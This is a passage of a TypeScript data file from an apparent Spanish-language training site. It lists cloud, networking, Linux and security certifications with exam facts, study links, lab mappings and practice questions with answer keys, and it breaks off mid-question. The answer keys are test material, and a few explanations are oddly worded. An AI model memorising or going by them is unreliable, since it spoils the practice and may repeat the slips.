import type { IconName } from "./icons";
import type { PathSlug } from "./paths";
import type { ExamQuestion } from "./questions";

export interface StudyResource {
  name: string;
  platform: string;
  type: "video" | "doc" | "course" | "guide";
  url: string;
  free: boolean;
  desc: string;
}

export interface DomainLabMapping {
  domainName: string;
  labIds: string[];
}

export interface Certification {
  slug: string;
  name: string;
  /** Código del examen, ej: CLF-C02. */
  code: string;
  vendor: string;
  /** Iniciales para el badge, ej: AWS / C+. */
  badge: string;
  /** Arte oficial público del badge, si existe. */
  badgeImage?: string;
  level: string;
  icon: IconName;
  /** Color de marca del vendor. */
  accent: string;
  summary: string;
  /** Consejos estratégicos para el examen. */
  prepTips: string[];
  /** Recursos recomendados con protagonismo. */
  studyResources: StudyResource[];
  /** Mapeo de labs por dominio. */
  domainLabs: DomainLabMapping[];
  /** Datos logísticos del examen real (aprox., verificá la guía oficial). */
  meta: {
    /** Cantidad de preguntas del examen real. */
    questions: number;
    /** Duración en minutos. */
    durationMin: number;
    /** Puntaje para aprobar (ej: "700/1000"). */
    passingScore: string;
    /** Costo aproximado en USD. */
    cost: string;
    /** Validez de la certificación en años. */
    validityYears: number;
    /** Formato de las preguntas. */
    format: string;
  };
  /** Lo que sabés hacer al certificarte. */
  outcomes: string[];
  /** Dominios del examen con su peso. */
  domains: { name: string; weight: number }[];
  /** Rutas de Open Security Labs que preparan para esta certi. */
  relatedPaths: PathSlug[];
  /** Examen de práctica (preguntas propias). */
  exam: ExamQuestion[];
}

export const certifications: Certification[] = [
  {
    slug: "aws-cloud-practitioner",
    name: "AWS Certified Cloud Practitioner",
    code: "CLF-C02",
    vendor: "Amazon Web Services",
    badge: "AWS",
    badgeImage: "/certifications/aws-cloud-practitioner.png",
    level: "Fundamental",
    icon: "cloud",
    accent: "#ff9900",
    summary:
      "La puerta de entrada a AWS: conceptos de nube, seguridad, servicios principales y facturación. Ideal como primer certificado de cloud.",
    prepTips: [
      "Entendé al detalle el modelo de responsabilidad compartida: qué hace AWS y qué te toca hacer a vos.",
      "Diferenciá los planes de soporte (Developer, Business, Enterprise) y sus tiempos de respuesta mínimos.",
      "Aprendé la diferencia entre CloudWatch (monitoreo/alarmas) y CloudTrail (auditoría de llamadas a la API)."
    ],
    studyResources: [
      {
        name: "AWS Skill Builder: Cloud Practitioner Essentials",
        platform: "AWS",
        type: "course",
        url: "https://explore.skillbuilder.aws/learn/course/external/view/elearning/16434/aws-cloud-practitioner-essentials",
        free: true,
        desc: "El curso oficial gratuito de AWS de 6 horas que cubre todos los fundamentos y servicios Core."
      },
      {
        name: "Guía de Examen Oficial CLF-C02",
        platform: "AWS Docs",
        type: "guide",
        url: "https://d1.awsstatic.com/training-and-certification/category-resources/AWS-Certified-Cloud-Practitioner_Exam-Guide_C02.pdf",
        free: true,
        desc: "El temario oficial detallado con la ponderación exacta de cada dominio y ejemplo de preguntas."
      },
      {
        name: "AWS Certified Cloud Practitioner Full Course",
        platform: "freeCodeCamp / Andrew Brown",
        type: "video",
        url: "https://www.youtube.com/watch?v=SOTamWGuqnM",
        free: true,
        desc: "Curso completo de video de 14 horas con explicaciones detalladas y laboratorios paso a paso."
      }
    ],
    domainLabs: [
      {
        domainName: "Seguridad y cumplimiento",
        labIds: ["cloud-produccion/iam-deny-gana", "cloud-produccion/s3-bucket-publico-sin-querer", "cloud-produccion/cloudtrail-quien-hizo-que"]
      },
      {
        domainName: "Conceptos de la nube",
        labIds: ["cloud-produccion/aws-desde-cero", "cloud-produccion/blast-radius-costo"]
      },
      {
        domainName: "Tecnología y servicios de la nube",
        labIds: ["cloud-produccion/vpc-security-groups"]
      }
    ],
    meta: {
      questions: 65,
      durationMin: 90,
      passingScore: "700/1000",
      cost: "USD 100",
      validityYears: 3,
      format: "Opción múltiple y respuesta múltiple",
    },
    outcomes: [
      "Explicar el modelo de responsabilidad compartida de AWS.",
      "Identificar los servicios core de cómputo, storage y base de datos.",
      "Entender precios, facturación, y planes de soporte técnico.",
      "Reconocer buenas prácticas de seguridad y gobernanza en la nube."
    ],
    domains: [
      { name: "Conceptos de la nube", weight: 24 },
      { name: "Seguridad y cumplimiento", weight: 30 },
      { name: "Tecnología y servicios de la nube", weight: 34 },
      { name: "Facturación, precios y soporte", weight: 12 },
    ],
    relatedPaths: ["cloud-produccion", "redes-internet"],
    exam: [
      {
        q: "Según el modelo de responsabilidad compartida, ¿quién parchea el sistema operativo de una instancia EC2?",
        options: [
          "AWS, siempre",
          "El cliente",
          "Nadie: las instancias se actualizan solas",
        ],
        answer: 1,
        explain:
          "AWS es responsable de la seguridad DE la nube (hardware, hipervisor). El cliente es responsable de la seguridad EN la nube: el SO invitado, los parches y la configuración de EC2.",
      },
      {
        q: "¿Qué servicio registra las llamadas a la API de tu cuenta para auditoría e investigación?",
        options: ["Amazon CloudWatch", "AWS CloudTrail", "AWS Config"],
        answer: 1,
        explain:
          "CloudTrail registra quién hizo qué llamada a la API, cuándo y desde dónde. CloudWatch es métricas y logs operativos; Config evalúa el estado de los recursos.",
      },
      {
        q: "Querés que un usuario solo pueda leer un bucket S3 y nada más. ¿Qué principio aplicás?",
        options: [
          "Mínimo privilegio, con una política de IAM acotada",
          "Le das permisos de administrador por las dudas",
          "Compartís las credenciales root",
        ],
        answer: 0,
        explain:
          "Mínimo privilegio: dar solo los permisos necesarios. Nunca se usa el usuario root para tareas diarias ni se reparten permisos de admin 'por las dudas'.",
      },
      {
        q: "¿Qué concepto de AWS te da alta disponibilidad al desplegar en ubicaciones aisladas dentro de una región?",
        options: [
          "Edge Locations",
          "Availability Zones (zonas de disponibilidad)",
          "IAM Roles",
        ],
        answer: 1,
        explain:
          "Una región tiene varias Availability Zones físicamente separadas. Distribuir en varias AZ tolera la caída de una sin perder el servicio.",
      },
      {
        q: "¿Qué herramienta te permite estimar el costo de una arquitectura ANTES de desplegarla?",
        options: ["AWS Cost Explorer", "AWS Pricing Calculator", "AWS Budgets"],
        answer: 1,
        explain:
          "Pricing Calculator estima costos por adelantado. Cost Explorer analiza el gasto ya ocurrido y Budgets alerta cuando te pasás de un umbral.",
      },
      {
        q: "El modelo de precios 'pay-as-you-go' de la nube significa que…",
        options: [
          "Pagás una licencia anual fija",
          "Pagás solo por lo que consumís, sin compromiso a largo plazo obligatorio",
          "Es gratis hasta cierto límite y después se corta",
        ],
        answer: 1,
        explain:
          "Pay-as-you-go: pagás por uso real. Esto convierte gasto de capital (CapEx) en gasto operativo (OpEx) y permite escalar sin comprar hardware por adelantado.",
      },
      {
        q: "¿Cuál es el beneficio de usar una instancia EC2 reservada en lugar de una On-Demand?",
        options: [
          "Se conecta automáticamente a un Load Balancer",
          "Te otorga un descuento significativo a cambio de un compromiso de 1 o 3 años",
          "Tiene discos SSD infinitos por defecto",
        ],
        answer: 1,
        explain:
          "Las instancias reservadas (y Savings Plans) ofrecen descuentos importantes a cambio de comprometerse a un volumen de cómputo específico por un plazo fijo."
      },
      {
        q: "¿Qué servicio de base de datos relacional de AWS se encarga automáticamente de tareas como parches y backups?",
        options: ["Amazon DynamoDB", "Amazon RDS", "Amazon Redshift"],
        answer: 1,
        explain:
          "Amazon RDS es un servicio relacional administrado que automatiza tareas de mantenimiento. DynamoDB es NoSQL administrado y Redshift es para data warehousing."
      },
      {
        q: "¿Qué servicio proporciona protección DDoS administrada y automática para todas las cuentas de AWS sin costo adicional?",
        options: ["AWS Shield Standard", "AWS WAF", "AWS GuardDuty"],
        answer: 0,
        explain:
          "AWS Shield Standard protege de manera gratuita contra ataques DDoS en capas de red y transporte. AWS WAF protege la capa de aplicación y es de pago."
      },
      {
        q: "¿Cuál es el propósito del marco de arquitectura bien diseñada (Well-Architected Framework) de AWS?",
        options: [
          "Garantizar que tu aplicación sea 100% gratuita",
          "Proporcionar principios de diseño y mejores prácticas para evaluar arquitecturas",
          "Permitir la generación automática de código de infraestructura",
        ],
        answer: 1,
        explain:
          "El marco Well-Architected ayuda a los arquitectos de nube a construir la infraestructura más segura, de alto rendimiento, resiliente y eficiente posible a través de 6 pilares."
      }
    ],
  },
  {
    slug: "comptia-security-plus",
    name: "CompTIA Security+",
    code: "SY0-701",
    vendor: "CompTIA",
    badge: "S+",
    badgeImage: "/certifications/comptia-security-plus.png",
    level: "Asociado",
    icon: "shield",
    accent: "#c80f2e",
    summary:
      "El certificado base de ciberseguridad más pedido en avisos de trabajo. Cubre amenazas, arquitectura segura, operaciones y gestión de riesgo.",
    prepTips: [
      "Memorizá la lista de puertos comunes y sus protocolos (ej: 22/SSH, 443/HTTPS, 80/HTTP, 53/DNS, 3389/RDP).",
      "Dominá las diferencias sutiles entre ataques de ingeniería social: Phishing, Spear Phishing, Whaling, Vishing y Smishing.",
      "Estudiá el modelo Zero Trust y sus principios: verificar explícitamente, usar el mínimo privilegio y asumir la brecha."
    ],
    studyResources: [
      {
        name: "Professor Messer's SY0-701 Security+ Training Course",
        platform: "YouTube",
        type: "video",
        url: "https://www.youtube.com/playlist?list=PLG49S3nxzAn34g4XKG6xM8O805D9Y83x2",
        free: true,
        desc: "El curso gratuito más famoso de la comunidad que cubre absolutamente todos los objetivos del examen oficial."
      },
      {
        name: "CompTIA Security+ SY0-701 Exam Objectives",
        platform: "CompTIA",
        type: "guide",
        url: "https://www.comptia.jp/pdf/CompTIA%20Security+%20SY0-701%20Exam%20Objectives%20(3.0).pdf",
        free: true,
        desc: "El PDF oficial con cada concepto y acrónimo que pueden llegar a tomar en el examen real."
      }
    ],
    domainLabs: [
      {
        domainName: "Amenazas, vulnerabilidades y mitigaciones",
        labIds: ["ciberseguridad/xss-local-defensivo", "ciberseguridad/sql-injection-parametrizada", "ciberseguridad/threat-modeling-app-chica"]
      },
      {
        domainName: "Arquitectura de seguridad",
        labIds: ["cloud-produccion/vpc-security-groups", "redes-internet/tls-sin-magia"]
      },
      {
        domainName: "Operaciones de seguridad",
        labIds: ["ciberseguridad/hashear-no-es-cifrar", "ciberseguridad/docker-socket-to-host", "ciberseguridad/por-que-chmod-777"]
      }
    ],
    meta: {
      questions: 90,
      durationMin: 90,
      passingScore: "750/900",
      cost: "USD 425",
      validityYears: 3,
      format: "Opción múltiple + preguntas basadas en desempeño (PBQ)",
    },
    outcomes: [
      "Evaluar la postura de seguridad de una organización.",
      "Identificar amenazas, ataques y vectores de vulnerabilidades.",
      "Diseñar y recomendar controles y arquitecturas seguras.",
      "Operar bajo marcos de cumplimiento y gestión de riesgos."
    ],
    domains: [
      { name: "Conceptos generales de seguridad", weight: 12 },
      { name: "Amenazas, vulnerabilidades y mitigaciones", weight: 22 },
      { name: "Arquitectura de seguridad", weight: 18 },
      { name: "Operaciones de seguridad", weight: 28 },
      { name: "Gestión y supervisión del programa", weight: 20 },
    ],
    relatedPaths: ["ciberseguridad", "redes-internet", "devsecops-agentes"],
    exam: [
      {
        q: "Verificás un archivo con su hash SHA-256 y coincide. ¿Qué propiedad de la tríada CIA estás comprobando?",
        options: ["Confidencialidad", "Integridad", "Disponibilidad"],
        answer: 1,
        explain:
          "Un hash que coincide prueba que el contenido no fue alterado: eso es integridad. Confidencialidad sería cifrado; disponibilidad, que el recurso esté accesible.",
      },
      {
        q: "Un correo de phishing muy dirigido apunta específicamente a un CEO. ¿Cómo se llama?",
        options: ["Spear phishing genérico", "Whaling", "Smishing"],
        answer: 1,
        explain:
          "Whaling es phishing dirigido a 'peces gordos' (ejecutivos). Smishing es por SMS. El spear phishing es dirigido pero no necesariamente a alta dirección.",
      },
      {
        q: "Te piden contraseña + código de una app autenticadora. ¿Qué dos factores se combinan?",
        options: [
          "Dos veces 'algo que sabés'",
          "'Algo que sabés' + 'algo que tenés'",
          "'Algo que sos' + 'algo que sabés'",
        ],
        answer: 1,
        explain:
          "La contraseña es algo que sabés; el código de la app (en tu teléfono) es algo que tenés. MFA real encripta factores de categorías DISTINTAS.",
      },
      {
        q: "¿Cuál es la diferencia entre un IDS y un IPS?",
        options: [
          "El IDS detecta y alerta; el IPS además puede bloquear",
          "Son lo mismo con distinto nombre",
          "El IDS bloquea; el IPS solo registra",
        ],
        answer: 0,
        explain:
          "IDS (Detection) detecta y avisa. IPS (Prevention) está en línea y puede frenar el tráfico malicioso activamente.",
      },
      {
        q: "Una app guarda contraseñas para poder mostrárselas al usuario. ¿Por qué está mal?",
        options: [
          "Debería cifrarlas reversiblemente",
          "Debería guardar un hash con salt, no algo recuperable",
          "Está bien si la base de datos es privada",
        ],
        answer: 1,
        explain:
          "Las contraseñas se guardan como hash con salt (bcrypt, Argon2), no de forma recuperable. Si podés mostrarlas, un atacante que robe la base también puede.",
      },
      {
        q: "Aplicás 'defense in depth'. ¿Qué significa?",
        options: [
          "Un único control muy fuerte en el perímetro",
          "Múltiples capas de controles, para que el fallo de una no comprometa todo",
          "Cifrar todo dos veces",
        ],
        answer: 1,
        explain:
          "Defensa en profundidad: varias capas independientes (red, host, app, identidad). Si una falla, las otras siguen conteniendo el ataque.",
      },
      {
        q: "¿Qué tipo de malware se propaga de forma autónoma a través de la red sin necesidad de interactuar con un archivo ejecutable?",
        options: ["Virus", "Gusano (Worm)", "Troyano"],
        answer: 1,
        explain:
          "Un gusano (worm) se propaga de forma automática explotando fallos en la red. Un virus requiere la ejecución de un archivo infectado por parte de un usuario."
      },
      {
        q: "¿Cuál de los siguientes es un ejemplo de un control de seguridad físico?",
        options: [
          "Una política de contraseñas complejas",
          "Un firewall de capa de aplicación",
          "Una lectora de tarjetas de proximidad en la entrada",
        ],
        answer: 2,
        explain:
          "Los controles físicos restringen el acceso al espacio físico (ej. rejas, guardias, tarjetas de proximidad). Los otros son controles lógicos/técnicos o administrativos."
      },
      {
        q: "Un ataque de 'Man-in-the-Middle' ocurre típicamente porque un atacante logra envenenar la tabla de traducción de direcciones IP a MAC. ¿Cómo se llama este ataque?",
        options: ["DNS Spoofing", "ARP Poisoning", "MAC Flooding"],
        answer: 1,
        explain:
          "ARP Poisoning asocia la dirección IP de la puerta de enlace a la dirección MAC del atacante, permitiendo interceptar el tráfico local."
      },
      {
        q: "¿Cuál de los siguientes algoritmos de cifrado es asimétrico?",
        options: ["AES", "RSA", "ChaCha20"],
        answer: 1,
        explain:
          "RSA utiliza un par de claves (pública y privada), lo que lo hace asimétrico. AES y ChaCha20 son algoritmos simétricos rápidos."
      }
    ],
  },
  {
    slug: "comptia-network-plus",
    name: "CompTIA Network+",
    code: "N10-009",
    vendor: "CompTIA",
    badge: "N+",
    badgeImage: "/certifications/comptia-network-plus.png",
    level: "Asociado",
    icon: "network",
    accent: "#c80f2e",
    summary:
      "Fundamentos de redes que sostienen todo lo demás: modelo OSI, TCP/IP, routing, servicios de red y troubleshooting.",
    prepTips: [
      "Entendé cómo calcular máquinas CIDR rápidamente y cuántos hosts útiles te deja una subred (fórmula: 2^n - 2).",
      "Asimilá el modelo OSI capa por capa y qué dispositivo vive en cada una (Switches en Capa 2, Routers en Capa 3).",
      "Estudiá el funcionamiento y los códigos de error/mensajes de ICMP (ej: para comandos como ping y traceroute)."
    ],
    studyResources: [
      {
        name: "Professor Messer's N10-009 Network+ Course",
        platform: "YouTube",
        type: "video",
        url: "https://www.youtube.com/playlist?list=PLG49S3nxzAn3gTShyG5VshOsuJ6z2E9H9",
        free: true,
        desc: "Curso completo actualizado al examen N10-009 con explicaciones visuales de networking e infraestructura."
      },
      {
        name: "Network+ N10-009 Exam Objectives",
        platform: "CompTIA",
        type: "guide",
        url: "https://www.comptia.org/docs/default-source/exam-objectives/comptia-network-n10-009-exam-objectives-(2-0).pdf",
        free: true,
        desc: "Documento oficial que enumera todos los protocolos, tipos de cables, conectores y estándares inalámbricos."
      }
    ],
    domainLabs: [
      {
        domainName: "Networking Concepts",
        labIds: ["redes-internet/una-request-no-es-magia", "redes-internet/dns-paso-a-paso"]
      },
      {
        domainName: "Network Implementation",
        labIds: ["redes-internet/leer-un-cidr-sin-calculadora", "cloud-produccion/vpc-security-groups"]
      },
      {
        domainName: "Network Troubleshooting",
        labIds: ["redes-internet/status-codes-4xx-vs-5xx"]
      }
    ],
    meta: {
      questions: 90,
      durationMin: 90,
      passingScore: "720/900",
      cost: "USD 369",
      validityYears: 3,
      format: "Opción múltiple + preguntas basadas en desempeño (PBQ)",
    },
    outcomes: [
      "Diseñar, implementar y dar soporte a redes cableadas e inalámbricas.",
      "Configurar y resolver problemas en direccionamiento IPv4 e IPv6.",
      "Configurar switches, routers y segmentación con VLANs.",
      "Identificar y resolver fallos comunes de red usando herramientas de diagnóstico."
    ],
    domains: [
      { name: "Conceptos de redes", weight: 23 },
      { name: "Implementación de redes", weight: 20 },
      { name: "Operaciones de red", weight: 19 },
      { name: "Seguridad de red", weight: 14 },
      { name: "Troubleshooting de red", weight: 24 },
    ],
    relatedPaths: ["redes-internet", "linux-real"],
    exam: [
      {
        q: "¿En qué capa del modelo OSI opera el direccionamiento IP y el routing?",
        options: ["Capa 2 (enlace)", "Capa 3 (red)", "Capa 4 (transporte)"],
        answer: 1,
        explain:
          "IP y routing viven en la capa 3 (red). La capa 2 maneja MAC dentro de un segmento; la capa 4, puertos y TCP/UDP.",
      },
      {
        q: "¿Qué puerto usa HTTPS por defecto?",
        options: ["80", "443", "22"],
        answer: 1,
        explain:
          "HTTPS usa 443; HTTP usa 80; SSH usa 22. Conocer los puertos comunes acelera el diagnóstico.",
      },
      {
        q: "Una red /24 (255.255.255.0), ¿cuántas direcciones utilizables para hosts tiene?",
        options: ["256", "254", "512"],
        answer: 1,
        explain:
          "/24 da 256 direcciones, pero una es la de red y otra la de broadcast, así que quedan 254 utilizables para hosts.",
      },
      {
        q: "¿Qué servicio asigna automáticamente direcciones IP a los dispositivos de una red?",
        options: ["DNS", "DHCP", "NAT"],
        answer: 1,
        explain:
          "DHCP reparte IPs automáticamente. DNS traduce nombres a IPs; NAT traduce direcciones privadas a públicas.",
      },
      {
        q: "Hay conectividad por IP pero los nombres no resuelven. ¿Dónde mirás primero?",
        options: [
          "El cableado físico",
          "La configuración de DNS",
          "La fuente de alimentación del switch",
        ],
        answer: 1,
        explain:
          "Si ping por IP funciona pero por nombre no, el problema está en la resolución: DNS. Es un clásico de troubleshooting por capas.",
      },
      {
        q: "¿Qué permite NAT en un router doméstico?",
        options: [
          "Que muchos dispositivos con IP privada compartan una IP pública",
          "Cifrar el tráfico de salida",
          "Asignar nombres de dominio",
        ],
        answer: 0,
        explain:
          "NAT (Network Address Translation) deja que varios hosts con IP privada salgan a internet por una sola IP pública.",
      },
      {
        q: "¿Qué protocolo de enrutamiento es de tipo Vector de Distancia?",
        options: ["OSPF", "RIP", "BGP"],
        answer: 1,
        explain:
          "RIP es un protocolo clásico de vector de distancia basado en número de saltos. OSPF es de estado de enlace (Link-State) y BGP es de vector de ruta (Path-Vector)."
      },
      {
        q: "¿Qué capa de modelo OSI se encarga de fragmentar los datos y garantizar una transferencia de datos confiable y orientada a conexión?",
        options: ["Capa 3 (Red)", "Capa 4 (Transporte)", "Capa 5 (Sesión)"],
        answer: 1,
        explain:
          "La capa de transporte (Capa 4), mediante TCP, se encarga del control de flujo, fragmentación y entrega confiable de datos."
      },
      {
        q: "¿Cuál es la función principal de una VLAN?",
        options: [
          "Cifrar el tráfico de datos",
          "Agrupar lógicamente dispositivos en dominios de broadcast separados en el mismo switch",
          "Proporcionar traducción de direcciones de red",
        ],
        answer: 1,
        explain:
          "Las VLANs segmentan redes a nivel lógico (capa 2), permitiendo aislar el tráfico de difusión (broadcast) sin necesidad de switches físicos separados."
      },
      {
        q: "¿Cuál de las siguientes herramientas te permite rastrear la ruta que toma un paquete a través de routers hasta su destino?",
        options: ["ping", "nslookup", "traceroute (o tracert)"],
        answer: 2,
        explain:
          "Traceroute envía paquetes con valores TTL crecientes para mapear cada salto (router) en el camino hacia el destino."
      }
    ],
  },
  {
    slug: "comptia-linux-plus",
    name: "CompTIA Linux+",
    code: "XK0-006",
    vendor: "CompTIA",
    badge: "L+",
    badgeImage: "/certifications/comptia-linux-plus.png",
    level: "Asociado",
    icon: "terminal",
    accent: "#c80f2e",
    summary:
      "Administración de Linux moderna enfocada en cloud y contenedores: operaciones del sistema, automatización con Ansible, scripting y Docker.",
    prepTips: [
      "Estudiá el modelo de permisos en octal y simbólico, además de los permisos especiales (SUID, SGID y Sticky Bit).",
      "Dominá las herramientas de systemd: journalctl para logs y systemctl para arrancar, detener y habilitar servicios.",
      "Aprendé la sintaxis básica de Docker (docker run, build, compose) y configuración básica de Ansible."
    ],
    studyResources: [
      {
        name: "Free Linux+ Certification Prep Video Series",
        platform: "YouTube / NetworkChuck",
        type: "video",
        url: "https://www.youtube.com/playlist?list=PLIhvC56v6w88H834F9Wz5c99P_z7507Bv",
        free: true,
        desc: "Videos interactivos y muy entretenidos para aprender la administración de sistemas Linux desde cero."
      },
      {
        name: "CompTIA Linux+ XK0-006 Exam Objectives",
        platform: "CompTIA",
        type: "guide",
        url: "https://www.comptia.jp/pdf/CompTIA%20Linux+%20XK0-006%20Exam%20Objectives.pdf",
        free: true,
        desc: "El temario del examen oficial donde verás el nuevo peso de contenedores, nubes híbridas y Ansible."
      }
    ],
    domainLabs: [
      {
        domainName: "Gestión del sistema",
        labIds: ["linux-real/filesystem-real", "linux-real/systemd-y-journalctl"]
      },
      {
        domainName: "Seguridad",
        labIds: ["linux-real/permisos-usuarios-procesos", "linux-real/permisos-en-octal", "ciberseguridad/por-que-chmod-777"]
      },
      {
        domainName: "Scripting, contenedores y automatización",
        labIds: ["ciberseguridad/docker-socket-to-host"]
      }
    ],
    meta: {
      questions: 90,
      durationMin: 90,
      passingScore: "720/900",
      cost: "USD 369",
      validityYears: 3,
      format: "Opción múltiple + preguntas basadas en desempeño (PBQ)",
    },
    outcomes: [
      "Configurar y administrar almacenamiento, procesos y redes en servidores Linux.",
      "Desplegar y orquestar contenedores con Docker y configurar automatizaciones con Ansible.",
      "Hardonizar sistemas y configurar políticas de permisos avanzados (ACLs y SELinux).",
      "Diagnosticar fallos del kernel, almacenamiento y conectividad."
    ],
    domains: [
      { name: "Gestión del sistema", weight: 32 },
      { name: "Seguridad", weight: 21 },
      { name: "Scripting, contenedores y automatización", weight: 19 },
      { name: "Troubleshooting", weight: 28 },
    ],
    relatedPaths: ["linux-real", "ciberseguridad"],
    exam: [
      {
        q: "Un archivo tiene permisos -rw-r-----. ¿Cuál es su representación octal?",
        options: ["640", "644", "660"],
        answer: 0,
        explain:
          "rw- = 6, r-- = 4, --- = 0 → 640. El dueño lee/escribe, el grupo solo lee, otros no acceden.",
      },
      {
        q: "¿Qué comando muestra los sockets en escucha y el proceso dueño de cada puerto?",
        options: ["ls -l", "ss -tulpn", "df -h"],
        answer: 1,
        explain:
          "ss -tulpn lista puertos TCP/UDP en escucha con su proceso. ls lista archivos; df muestra uso de disco.",
      },
      {
        q: "¿Qué permiso necesita SÍ o SÍ una clave privada SSH para que ssh la acepte?",
        options: ["644", "600", "777"],
        answer: 1,
        explain:
          "600 (solo el dueño lee/escribe). Con permisos más abiertos, SSH se niega a usar la clave por seguridad.",
      },
      {
        q: "¿Qué herramienta consultás para ver los logs de un servicio gestionado por systemd?",
        options: ["journalctl", "crontab", "top"],
        answer: 0,
        explain:
          "journalctl lee el journal de systemd (ej: journalctl -u nginx). crontab edita tareas programadas; top muestra procesos en vivo.",
      },
      {
        q: "Querés ver qué proceso consume más CPU en tiempo real. ¿Qué usás?",
        options: ["top (o htop)", "cat", "chmod"],
        answer: 0,
        explain:
          "top/htop muestran procesos ordenados por consumo en vivo. cat imprime archivos; chmod cambia permisos.",
      },
      {
        q: "¿Qué hace 'chmod 755 script.sh'?",
        options: [
          "Dueño rwx; grupo y otros r-x (leen y ejecutan)",
          "Todos pueden escribir",
          "Solo el dueño puede leerlo",
        ],
        answer: 0,
        explain:
          "755 = rwxr-xr-x. El dueño tiene control total; grupo y otros pueden leer y ejecutar, pero no modificar. Típico de ejecutables.",
      },
      {
        q: "¿Qué herramienta se utiliza comúnmente en Linux para automatizar tareas repetitivas en intervalos de tiempo predefinidos?",
        options: ["systemd-analyze", "cron (mediante crontab)", "systemctl"],
        answer: 1,
        explain:
          "El demonio cron permite programar scripts y comandos para ejecutarse periódicamente utilizando configuraciones crontab."
      },
      {
        q: "Necesitás ver el espacio disponible en todos los sistemas de archivos montados en formato legible para humanos (ej: GB, MB). ¿Qué comando usás?",
        options: ["du -sh", "df -h", "lsblk"],
        answer: 1,
        explain:
          "df -h muestra el espacio libre en los filesystems montados. du -sh calcula el uso de disco de un directorio o archivo específico."
      },
      {
        q: "¿Cuál de los siguientes directorios almacena archivos de configuración del sistema en Linux?",
        options: ["/var", "/opt", "/etc"],
        answer: 2,
        explain:
          "El directorio `/etc` contiene los archivos de configuración estática del sistema operativo y servicios instalados."
      },
      {
        q: "¿Qué comando de Docker se utiliza para compilar una imagen a partir de un archivo Dockerfile?",
        options: ["docker run", "docker build", "docker commit"],
        answer: 1,
        explain:
          "docker build procesa el archivo Dockerfile para compilar y empaquetar una nueva imagen de contenedor localmente."
      }
    ],
  },
  {
    slug: "aws-solutions-architect-associate",
    name: "AWS Solutions Architect – Associate",
    code: "SAA-C03",
    vendor: "Amazon Web Services",
    badge: "AWS",
    badgeImage: "/certifications/aws-solutions-architect-associate.png",
    level: "Asociado",
    icon: "server",
    accent: "#ff9900",
    summary:
      "Diseñar arquitecturas seguras, resilientes, performantes y costo-eficientes en AWS. El paso siguiente después del Cloud Practitioner.",
    prepTips: [
      "Dominá las arquitecturas desacopladas basadas en eventos: SQS (colas), SNS (mensajes pub/sub) y EventBridge.",
      "Aprendé cuándo usar cada tipo de base de datos (RDS para SQL, DynamoDB para NoSQL rápidos, ElastiCache para caché).",
      "Entendé a fondo la diferencia de ruteo y uso de balanceadores (ALB para HTTP/HTTPS en Capa 7 y NLB para protocolos TCP/UDP rápidos en Capa 4)."
    ],
    studyResources: [
      {
        name: "AWS Certified Solutions Architect Associate - Free Course",
        platform: "freeCodeCamp / Andrew Brown",
        type: "video",
        url: "https://www.youtube.com/watch?v=Ia-UEYYqg_0",
        free: true,
        desc: "Un curso masivo de más de 50 horas de pura teoría arquitectónica y laboratorios prácticos en la consola."
      },
      {
        name: "AWS Exam Prep Guide (SAA-C03)",
        platform: "AWS Docs",
        type: "guide",
        url: "https://d1.awsstatic.com/training-and-certification/category-resources/AWS-Certified-Solutions-Architect-Associate_Exam-Guide.pdf",
        free: true,
        desc: "La guía de estudio oficial de AWS para arquitectos, con los criterios de evaluación de resiliencia y costos."
      }
    ],
    domainLabs: [
      {
        domainName: "Diseño de arquitecturas seguras",
        labIds: ["cloud-produccion/iam-deny-gana", "cloud-produccion/s3-bucket-publico-sin-querer", "cloud-produccion/cloudtrail-quien-hizo-que"]
      },
      {
        domainName: "Diseño de arquitecturas de alto rendimiento",
        labIds: ["cloud-produccion/vpc-security-groups", "backend-arquitectura/nats-jetstream-subjects-streams-consumers"]
      },
      {
        domainName: "Diseño de arquitecturas costo-optimizadas",
        labIds: ["cloud-produccion/blast-radius-costo"]
      }
    ],
    meta: {
      questions: 65,
      durationMin: 130,
      passingScore: "720/1000",
      cost: "USD 150",
      validityYears: 3,
      format: "Opción múltiple y respuesta múltiple",
    },
    outcomes: [
      "Diseñar arquitecturas seguras, resilientes y eficientes en AWS.",
      "Elegir servicios de cómputo, storage y base de datos bajo criterios técnicos concretos.",
      "Optimizar costos analizando cuotas y patrones de uso de recursos.",
      "Mitigar riesgos mediante redundancia, backups automáticos y Multi-AZ."
    ],
    domains: [
      { name: "Diseño de arquitecturas seguras", weight: 30 },
      { name: "Diseño de arquitecturas resilientes", weight: 26 },
      { name: "Diseño de arquitecturas de alto rendimiento", weight: 24 },
      { name: "Diseño de arquitecturas costo-optimizadas", weight: 20 },
    ],
    relatedPaths: ["cloud-produccion", "backend-arquitectura"],
    exam: [
      {
        q: "Necesitás almacenamiento de objetos durable y scalable para archivos estáticos. ¿Qué servicio elegís?",
        options: ["Amazon EBS", "Amazon S3", "Amazon RDS"],
        answer: 1,
        explain:
          "S3 es almacenamiento de objetos (11 9's de durabilidad). EBS son discos para EC2; RDS es base de datos relacional.",
      },
      {
        q: "Querés desacoplar un productor de un consumidor para tolerar picos de carga. ¿Qué usás?",
        options: [
          "Una cola Amazon SQS entre ambos",
          "Llamadas síncronas directas",
          "Un único servidor más grande",
        ],
        answer: 0,
        explain:
          "Una cola (SQS) desacopla: el productor encola y el consumidor procesa a su ritmo. Absorbe picos y tolera fallos transitorios.",
      },
      {
        q: "En una VPC, ¿qué diferencia a un Security Group de una Network ACL?",
        options: [
          "El Security Group es stateful; la NACL es stateless",
          "Son idénticos",
          "La NACL es stateful; el Security Group es stateless",
        ],
        answer: 0,
        explain:
          "Los Security Groups son stateful (la respuesta a una conexión permitida se permite automáticamente). Las NACL son stateless: hay que permitir ida y vuelta por separado.",
      },
      {
        q: "Tu sitio tiene usuarios globales y querés reducir latencia sirviendo contenido cacheado cerca de ellos. ¿Qué servicio?",
        options: ["Amazon CloudFront", "Amazon EBS", "AWS IAM"],
        answer: 0,
        explain:
          "CloudFront es la CDN de AWS: cachea contenido en edge locations cerca del usuario, bajando latencia.",
      },
      {
        q: "¿Cómo diseñás para que la caída de una sola zona no tire el servicio?",
        options: [
          "Desplegar en múltiples Availability Zones",
          "Una instancia más grande en una sola AZ",
          "Apagar el monitoreo para ahorrar",
        ],
        answer: 0,
        explain:
          "Resiliencia = multi-AZ: distribuir la carga (ej: detrás de un balanceador) en varias zonas para tolerar la falla de una.",
      },
      {
        q: "Querés dar a una aplicación en EC2 acceso a S3 SIN guardar credenciales en el código. ¿Qué usás?",
        options: [
          "Un IAM Role asignado a la instancia",
          "Las access keys del usuario root en una variable",
          "Un archivo .env con las claves en el repo",
        ],
        answer: 0,
        explain:
